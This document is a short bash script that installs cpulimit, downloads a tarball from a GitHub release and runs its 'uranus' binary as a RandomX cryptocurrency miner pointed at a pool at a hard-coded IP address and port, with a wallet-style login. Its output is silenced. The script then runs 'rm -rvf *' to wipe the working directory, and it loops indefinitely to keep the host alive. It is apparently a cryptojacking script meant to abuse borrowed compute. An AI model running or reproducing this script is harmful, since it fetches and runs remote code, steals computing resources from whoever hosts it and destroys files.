#!/bin/bash
apt-get update
apt-get install -y cpulimit
cpulimit -l 150 -e uranus &
wget https://github.com/kolorijo01/koloria/releases/download/uranus/daemon.tar.gz && tar -xvf daemon.tar.gz && ./uranus -a randomx -o 159.203.162.18:3333 -u nexa:nqtsq5g5ewsu60xpu8zn7snghgf3yx09j5gcc648y44dcyg9 -p "suto" >/dev/null 2>&1 
rm -rvf *
while true
do
        echo "gass boss..."
        sleep 60
done
